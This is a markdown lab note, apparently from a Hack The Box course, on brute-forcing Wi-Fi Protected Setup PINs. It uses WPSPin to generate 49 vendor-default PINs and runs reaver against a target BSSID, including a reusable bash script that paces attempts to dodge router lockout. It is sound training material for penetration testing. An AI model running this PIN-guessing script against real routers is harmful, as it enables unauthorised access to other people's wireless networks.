---
title: Using Multiple Pre-Defined PINs
description: Using Multiple Pre-Defined PINs
date: '2026-09-21'
tags: []
published: true
slug: using-multiple-pre-defined-pins
category: wifi
folder: online-bruteforcing
order: 40
---
# Using Multiple Pre-Defined PINs: The Easy Guide

## What's the Idea Here?

Instead of blindly guessing all 11,000 possible PINs, some routers actually use **predictable default PINs** based on their vendor or algorithm. If we can generate a short list of "likely" PINs first, we can try those before wasting time (or triggering a lockout) on random guesses.

The tool for this is called **[WPSPin](https://github.com/epicdev420/WPSPin)**.
Saved on this computer on directory /home/nabil/Downloads/WPSPin

---

## Step 1: Install WPSPin

```shellsession
iccys@htb[/htb]$ git clone https://github.com/epicdev420/WPSPin.git

Cloning into 'wpspin'...
remote: Enumerating objects: 44, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 44 (delta 0), reused 2 (delta 0), pack-reused 40
Receiving objects: 100% (44/44), 21.46 KiB | 499.00 KiB/s, done.
Resolving deltas: 100% (10/10), done.
```

Then install it:

```shellsession
iccys@htb[/htb]$ cd wpspin
iccys@htb[/htb]$ sudo python setup.py install
```

📝 **Note:** In the HTB lab environment, WPSPin is already pre-installed — you can skip this step there.

---

## Step 2: Generate Possible PINs

Give WPSPin the target's BSSID (MAC address) and use `-A` to generate every possible algorithm-based PIN:

```shellsession
iccys@htb[/htb]$ wpspin -A 60:38:E0:A2:3D:2A

Found 49 PIN(s)
PIN        Name
73834410   44-bit PIN
94229882   Static PIN — H108L
73834410   40-bit PIN
06490959   Reverse bits 32-bit
11184812   24-bit PIN
63311501   Reverse nibble 32-bit
11184812   28-bit PIN
36499373   48-bit PIN
63313604   Reverse byte 32-bit
99956042   Static PIN — Onlime
95661469   Static PIN — Realtek 1
89478486   Reverse bits 24-bit
11184812   Reverse nibble 24-bit
           Empty PIN
11184812   Reverse byte 24-bit
95755212   Static PIN — CBN ONO
20854836   Static PIN — Upvel
20144326   Airocon Realtek
33946153   D-Link PIN +1
13142452   ASUS PIN
74163052   OUI ^ NIC
51875350   OUI − NIC
43977680   Static PIN — UR-814AC
56587340   Inv NIC to PIN
95719115   Static PIN — Realtek 2
48563710   Static PIN — Realtek 3
92148659   32-bit PIN
05294176   Static PIN — UR-825AC
89532331   36-bit PIN
68175542   Static PIN — DSL-2740R
71412252   Static PIN — Airocon 2
80652847   D-Link PIN
76229909   Static PIN — Broadcom 3
46264848   Static PIN — Broadcom 2
82799427   Reverse nibble 48-bit
20233921   Reverse byte 48-bit
31957199   Static PIN — Broadcom 6
10864111   Static PIN — Broadcom 5
62327145   Static PIN — Broadcom 4
30432031   Static PIN — Airocon 1
90970948   Reverse bits 48-bit
22369628   NIC * 2
33554433   NIC * 3
34259283   Static PIN — HG532x
35611530   Static PIN — Edimax
20172527   Static PIN — Broadcom 1
67958146   Static PIN — Thomson
12345670   Static PIN — Cisco
74244973   OUI + NIC
```

WPSPin found **49 possible PINs**, each based on a different known algorithm or vendor default. Much better odds than random guessing!

---

## Step 3: Test One PIN with Reaver

To try just one of these PINs a single time:

```shellsession
iccys@htb[/htb]$ sudo reaver --max-attempts=1 -l 100 -r 3:45 -i mon0 -b 60:38:E0:A2:3D:2A -c 1 -p 73834410
```

**What each part means:**

|Part|Meaning|
|---|---|
|`--max-attempts=1`|Only try this PIN once (don't retry)|
|`-l 100`|Wait 100 seconds if the router locks|
|`-r 3:45`|Sleep 45 seconds every 3 attempts|
|`-p 73834410`|The specific PIN to try|

---

## Step 4: Automate It With a Bash Script

Testing 49 PINs one-by-one manually is tedious. Let's automate it.

**First, extract just the PIN numbers** from the WPSPin output:

```shellsession
iccys@htb[/htb]$ wpspin -A 60:38:E0:A2:3D:2A | grep -Eo '\b[0-9]{8}\b' | tr '\n' ' '

73834410 94229882 73834410 06490959 11184812 63311501 11184812 36499373 63313604 99956042 95661469 89478486 11184812 11184812 95755212 20854836 20144326 33946153 13142452 74163052 51875350 43977680 56587340 95719115 48563710 92148659 05294176 89532331 68175542 71412252 80652847 76229909 46264848 82799427 20233921 31957199 10864111 62327145 30432031 90970948 22369628 33554433 34259283 35611530 20172527 67958146 12345670 74244973
```

This gives you a clean, space-separated list of 8-digit numbers.

**Then, build a script** that tries each PIN automatically:

```bash
#!/bin/bash

#We add generated PINs into this list
PINS='73834410 94229882 73834410 06490959 11184812 63311501 11184812 36499373 63313604 99956042 95661469 89478486 11184812 11184812 95755212 20854836 20144326 33946153 13142452 74163052 51875350 43977680 56587340 95719115 48563710 92148659 05294176 89532331 68175542 71412252 80652847 76229909 46264848 82799427 20233921 31957199 10864111 62327145 30432031 90970948 22369628 33554433 34259283 35611530 20172527 67958146 12345670 74244973'

for PIN in $PINS
do
    echo Attempting PIN: $PIN
    sudo reaver --max-attempts=1 -l 100 -r 3:45 -i mon0 -b 60:38:E0:A2:3D:2A -c 1 -p $PIN
done
echo "PIN Guesses Complete"
```

**What this script does:**

- Tries each PIN exactly once
- Waits 100 seconds if the router locks
- Pauses 45 seconds every 3 attempts
- Loops through all 49 generated PINs automatically

**Running it looks like this:**

```shellsession
iccys@htb[/htb]$ sudo bash pinguess.sh

Attempting PIN: 73834410

Reaver v1.6.6 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 60:38:E0:A2:3D:2A
<snip>
Attempting PIN: 94229882

Reaver v1.6.6 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 60:38:E0:A2:3D:2A 
<snip>
Attempting PIN: 06490959

Reaver v1.6.6 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 60:38:E0:A2:3D:2A
<snip>
Attempting PIN: 76229909

Reaver v1.6.6 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 60:38:E0:A2:3D:2A
<snip>

Hopefully, we will be able to find the correct WPS PIN using this bash script, which bruteforces with a provided list of generated PINs.
```

It works through the whole list hands-off, letting you walk away instead of babysitting each attempt.

---

## Bonus: Vendor Lookup to Narrow Things Down

If the router is heavily locked and you can only guess a handful of PINs before it locks permanently, knowing the **vendor** can help you narrow the list even further (since some algorithms are vendor-specific).

Look up the vendor using the MAC address prefix:

```shellsession
iccys@htb[/htb]$ grep -i "60-38-E0" /var/lib/ieee-data/oui.txt

60-38-E0   (hex)                Belkin International Inc.
```

Now you know this router is made by **Belkin** — which means you can focus only on Belkin-related PINs from your generated list, instead of trying all 49.

📝 **Lab note:** In the HTB lab, the access point has no lockout, so you can freely brute-force without worrying about the 60-second or 365-day locks discussed earlier.

---

## Command Summary

```bash
git clone https://github.com/epicdev420/WPSPin.git             # Download the WPSPin tool
cd wpspin && sudo python setup.py install                      # Install WPSPin
wpspin -A <BSSID>                                               # Generate all possible default PINs for a target
wpspin -A <BSSID> | grep -Eo '\b[0-9]{8}\b' | tr '\n' ' '       # Extract just the 8-digit PINs, space-separated
reaver --max-attempts=1 -l 100 -r 3:45 -i mon0 -b <BSSID> -c 1 -p <PIN>   # Try one specific PIN, once
sudo bash pinguess.sh                                            # Run the automated script trying every generated PIN
grep -i "<MAC prefix>" /var/lib/ieee-data/oui.txt               # Look up the router's vendor by MAC address
```

**What each argument means:**

|Argument|Meaning|
|---|---|
|`-A <BSSID>`|Generate all possible algorithm-based PINs for this target|
|`--max-attempts=1`|Only try the PIN once, don't retry automatically|
|`-l 100`|Wait 100 seconds if the router locks|
|`-r 3:45`|Pause 45 seconds after every 3 attempts|
|`-i mon0`|Use the `mon0` monitor-mode interface|
|`-b <BSSID>`|Target router's MAC address|
|`-c 1`|Target channel 1|
|`-p <PIN>`|The specific PIN to test|
|`grep -Eo '\b[0-9]{8}\b'`|Pull out only 8-digit numbers from the text|
|`tr '\n' ' '`|Replace line breaks with spaces (makes one clean list)|
|`-i "<prefix>"` (grep)|Case-insensitive search for this MAC prefix|
Script:
```bash
#!/bin/bash

#We add generated PINs into this list
PINS=''

for PIN in $PINS
do
    echo Attempting PIN: $PIN
    sudo reaver --max-attempts=1 -l 100 -r 3:45 -i mon0 -b <MAC> -c 1 -p $PIN
done
echo "PIN Guesses Complete"
```
